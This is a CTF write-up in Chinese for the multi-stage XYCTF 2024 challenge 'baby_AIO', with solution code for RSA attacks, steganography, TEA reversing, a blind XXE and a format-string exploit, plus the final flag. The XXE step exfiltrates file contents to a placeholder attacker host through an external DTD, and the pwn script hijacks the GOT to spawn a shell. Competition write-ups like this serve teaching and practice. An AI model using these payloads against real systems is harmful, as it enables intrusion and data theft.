# baby_AIO

> 分类：Web（综合：Crypto / Misc / Reverse / Web / Pwn）

## 题目描述
余师傅出的一道跨五个方向的综合题（baby_AIO），将 Crypto、Misc、Reverse、Web、Pwn 五步串联。比赛中共 5 支队伍解出。

## 考察知识点
- Crypto：RSA dp 泄露、共模攻击
- Misc：Unicode 零宽隐写、Base64 套娃 zip
- Reverse：VM（TEA 解密）
- Web：XXE（无回显无报错，嵌套写绕过过滤）
- Pwn：格式化字符串（fmtstr）

## 解法

### 第一步 Crypto（dp 泄露 + 共模攻击）
利用 dp 泄露恢复 p、q：
```python
import gmpy2 as gp
e = 65537
n = 528565534050303289402007510968179435618186732104470795324112506464649249469837867028185617
dp = 487978202023750799970713551102136558437027925

for x in range(1, e):
    if(e*dp%x==1):
        p=(e*dp-1)//x+1
        if(n%p!=0):
            continue
        q=n//p
        phin=(p-1)*(q-1)
        d=gp.invert(e, phin)
        print("p = ", p)
        print("q = ", q)
```
再用共模攻击解密：
```python
import libnum, gmpy2
n1 = 60984961924036640364806324068224697071843724749390772716648370179057892113876360274026354662527777447902822720596626094363633542717821045035441273653134740082082972528467040631675108058268481211224587979227700303746708094408639881186270901498495613159595719501389800228775436242418332342165682104816100945559
e1 = 718052616328316407959060891790846549694362099
c1 = 14643165800600469237679161939570210679439096911755461832302138620621212724063371108183767129591712055258072458698793819383057004625557577440444773493982158481797933707633029392859049044470914532014267958303995860803871791733761877112192748951375669095992152628840179729532225161446048952172457991042916248568
n2 = n1
e2 = 736109753005379176045853848742061395149928683
c2 = 47744166763747993083913069262560688521758241055343711330487778299969300229670028543968082464934326523754042128559756835029869433598546417098582906459369495989688837877596260888669274901459794346656919486877501825652169698125071792901224555479266468029736677586557495945618181583432146191688552560789016927665
s, s1, s2 = gmpy2.gcdext(e1, e2)
m = (pow(c1, s1, n1)*pow(c2, s2, n2)) % n1
print(libnum.n2s(int(m)).decode())
```
得到内容：「the key of txt is XYXY1l0v3y0u and another key is 99 88 77 66」。

### 第二步 Misc（零宽 + 套娃 zip）
用 key `XYXY1l0v3y0u` 解密 zip，得到含 Unicode 零宽隐写的文本，隐写内容为「The username is WelcomeXY」，明文为一系列密码。enc 为 Base64 编码的套娃 zip，文件尾有「The username is WelcomeXY」。使用密码表：
```
SuyunandXiao
ZhaoWuandSuyun
Shinandlingfeng
nydnandk0rian
faultandalei
```
按顺序作为密码层层解压，最终得到 `ezre.apk`。

### 第三步 Reverse VM（TEA 解密）
`ezre.apk` 缺 ZipDirEntry 和 ZipEndLocator，用 7-Zip 强制解压再重新压缩为 zip 导入 JADX。MainActivity 输入 key 和 flag，在 JNI 加密。key 为 Misc 得到的 `99 88 77 66`。整理出 TEA 加密逻辑后写解密：
```c
#include <stdio.h>
#include "defs.h"
#define u32 unsigned int

const u32 key[] = {99, 88, 77, 66};

void decrypt(u32 *content)
{
    for (int i = 21; i > 0; i -= 2)
    {
        u32 delta = 0x12345678 * 32;
        for (int j = 0; j < 32; j++)
        {
            u32 l = content[i - 1];
            content[i] -= (((l << 4) ^ (l >> 5)) + l) ^ (delta + key[(delta >> 10) & 3]);
            delta -= 0x12345678;
            u32 r = content[i];
            content[i - 1] -= (((r << 4) ^ (r >> 5)) + r) ^ (delta + key[delta & 3]);
        }
    }
}
// 密文 ida_chars 省略，解密后打印每 4 字节的首字符
// https://baby.imxbt.cn/
```

### 第四步 Web XXE
无回显无报错 XXE，嵌套写三次绕过过滤：
```xml
<?xmxmxmlll version="1.0" ?>
<!DOCDOCDOCTYPETYPETYPE ANY [
    <!ENENENTITYTITYTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=hint.php">
    <!ENENENTITYTITYTITY % a SYSTEM "http://moyu.example.vps/test.dtd" >
    %a;%send;
]>
<credentials>
  <username>WelcomeXY</username>
  <password>YXemocleW</password>
</credentials>
```
test.dtd：
```xml
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://moyu.example.vps:4869/?p=%file;' >">
%int;
```
读到 hint.php 内容：
```
<?php
defined('ACCESS') or exit('干嘛，像偷窥我？');
echo "well！And now you can download the newpwn.zip in /HAHA/PWN";
?>
```
下载 `https://baby.imxbt.cn/HAHA/PWN/newpwn.zip`。

### 第五步 Pwn FmtStr
随机数本地校准时间同一秒设置种子生成，进入 vuln。第一次泄露栈地址和 libc 地址，并将 `.fini_array` 改为 vuln 函数地址再次进入；第二次把 printf 的 got 改为 system，返回地址改为 retn（栈 16 字节对齐）后跟 vuln 地址第三次进入；第三次调用 printf 实际是 system，输入 `/bin/sh\x00` get shell。

```python
from pwn import *
import ctypes

context.arch = 'amd64'
elf = ELF('./XYCTF')
libc = ELF('./libc.so.6')
io = process('./XYCTF')

lib_rand = ctypes.CDLL('./my_random.so')
lib_rand.random_number.restype = ctypes.c_int
lib_rand.set_seed()

for i in range(51):
    io.recvuntil(f'game: {i}\n'.encode())
    io.sendline(str(lib_rand.random_number()).encode())

io.recvuntil(b'Now,plz you input:\n')

printf_got = elf.got['printf']
addr_of_fini_array = 0x4031c0
payload = b'%p.%10$s.%4782d%9$hn....' + p64(addr_of_fini_array) + p64(printf_got)
payload += b'\x00' * (100 - len(payload))
io.send(payload)

res = io.recvuntil(b'Now,plz you input:\n')
addr_of_fmtstr = eval(res[:14])
addr_of_printf = int.from_bytes(res[15:21], 'little')
addr_of_system = addr_of_printf - libc.sym['printf'] + libc.sym['system']

addr_of_new_fmtstr = addr_of_fmtstr - 0xB0
addr_of_ret_addr = addr_of_new_fmtstr + 0x78

payload = b''
written_bytes = 0
addr_of_vuln = 0x4012c4
addr_of_C3 = 0x40132b
payload += f'%{(((addr_of_system&0xff0000)>>16)+0x100-written_bytes)&0xff}d%16$hhn'.encode()
written_bytes = (addr_of_system&0xff0000)>>16
payload += f'%{((addr_of_system&0xffff)+0x10000-written_bytes)&0xffff}d%17$hn'.encode()
written_bytes = addr_of_system&0xffff
payload += f'%{addr_of_vuln-written_bytes}d%15$ln'.encode()
written_bytes = addr_of_vuln
payload += f'%{addr_of_C3-written_bytes}d%14$ln'.encode()
payload += b'.' * (64 - len(payload))
payload += p64(addr_of_ret_addr)
payload += p64(addr_of_ret_addr + 8)
payload += p64(printf_got + 2)
payload += p64(printf_got)
payload += b'\x00' * (100 - len(payload))
io.send(payload)

io.recvuntil(b'Now,plz you input:\n', timeout=600)
io.sendline(b'/bin/sh\x00')
io.interactive()
```

## 参考答案
flag{XYCTF{0f1c8f3f-a2d9-4d9e-9cf4-175152030288}}

## 来源
- 作者：LilRan（摸鱼） | https://blog.xinshi.fun/wp/xyctf-2024-aio/
